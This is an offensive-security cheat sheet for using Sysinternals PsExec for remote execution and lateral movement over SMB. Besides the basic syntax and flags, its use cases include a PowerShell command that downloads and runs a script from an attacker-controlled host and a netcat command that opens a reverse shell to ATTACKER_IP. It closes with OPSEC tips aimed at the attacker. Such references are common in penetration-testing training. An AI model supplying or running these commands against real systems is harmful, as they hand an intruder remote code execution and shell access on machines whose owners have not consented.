PsExec is a very versatile tool that is part of the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite developed by Mark Russinovich. It's intended to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console.
Here's a concise PsExec cheat sheet tailored for offensive security operations:

---

### **PsExec Cheat Sheet**  
*For remote command execution and lateral movement via SMB*
### **Prerequisites**  

1. **Administrative Privileges**:  
   - The user authenticating to the target machine must be a member of the **Local Administrators group** on the target system.  
1. **ADMIN$ Share Availability**:  
   - The **ADMIN$** share (a hidden administrative share) must be accessible on the target machine.  
   - By default, this share is enabled on modern Windows systems and provides access to the `C:\Windows` directory.  

3. **File and Printer Sharing Enabled**:  
   - The **File and Printer Sharing** feature must be turned on.  
   - This is typically enabled by default on modern Windows Server systems and allows remote access to shared resources.  

---

### **1. Basic Syntax**  
```powershell
./PsExec64.exe \\TARGET -u DOMAIN\user -p password [options] <command>
```

---

### **2. Common Flags**  
| **Flag** | **Description**                                  |
|----------|--------------------------------------------------|
| `-i`     | Interactive session (desktop interaction)        |
| `-s`     | Run as SYSTEM account                            |
| `-d`     | Don't wait for process to exit                   |
| `-c`     | Copy local file to remote system                 |
| `-h`     | Run with elevated token (admin privileges)       |
| `-accepteula` | Bypass EULA prompt                          |

---

### **3. Common Use Cases**  
**A. Spawn interactive CMD:**  
```powershell
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

**B. Run single command:**  
```powershell
./PsExec64.exe \\192.168.1.10 -u admin -p Passw0rd! hostname
```

**C. Execute PowerShell payload:**  
```powershell
./PsExec64.exe \\TARGET -u user -p pass powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"
```

**D. File transfer + execution:**  
```powershell
./PsExec64.exe -c \\TARGET -u user -p pass C:\Tools\nc.exe "C:\Windows\Temp\nc.exe -e cmd ATTACKER_IP 443"
```


### **4. Key Requirements**  
- TCP 445 (SMB) access  
- Target must have Admin$ share enabled  
- User credentials with local admin privileges  
- PsExec allowed by AV/EDR (whitelisted in many environments)

---

### **5. OPSEC Considerations**  
❗ Leaves logs in `Security` event log (Event ID 4688)  
❗ Cleartext credentials in command-line arguments  
✅ Prefer `-s` to inherit SYSTEM context  
